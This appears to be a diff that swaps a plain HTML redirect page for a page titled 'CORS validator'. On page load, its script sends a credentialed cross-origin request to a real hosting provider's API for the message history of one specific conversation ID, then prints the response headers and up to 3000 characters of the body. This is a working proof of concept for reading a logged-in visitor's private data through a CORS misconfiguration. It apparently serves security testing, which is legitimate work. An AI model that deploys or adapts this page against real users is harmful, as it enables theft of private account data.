@@ -1,16 +1,33 @@
 <!doctype html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="refresh" content="0; url=https://example.com/target">
-    <link rel="canonical" href="https://example.com/target">
-    <script>
-      location.replace("https://example.com/target");
-    </script>
-    <title>Redirecting...</title>
-  </head>
-  <body>
-    Redirecting...
-    <a href="https://example.com/target">Click here if not redirected</a>.
-  </body>
+<head><meta charset="utf-8"><title>CORS validator</title></head>
+<body>
+<pre id="log"></pre>
+<script>
+const log = (x) => document.getElementById("log").textContent += x + "\n";
+
+(async () => {
+  try {
+    log("Origin: " + location.origin);
+
+    const r = await fetch("https://hpanel.hostinger.com/api/message-hub/api/v1/conversation/10080539/history", {
+      method: "GET",
+      credentials: "include"
+    });
+
+    log("Readable response reached");
+    log("Status: " + r.status);
+
+    for (const [k,v] of r.headers.entries()) {
+      log(k + ": " + v);
+    }
+
+    const body = await r.text();
+    log("\nBody:\n" + body.slice(0, 3000));
+  } catch (e) {
+    log("Blocked/Error: " + e);
+  }
+})();
+</script>
+</body>
 </html>
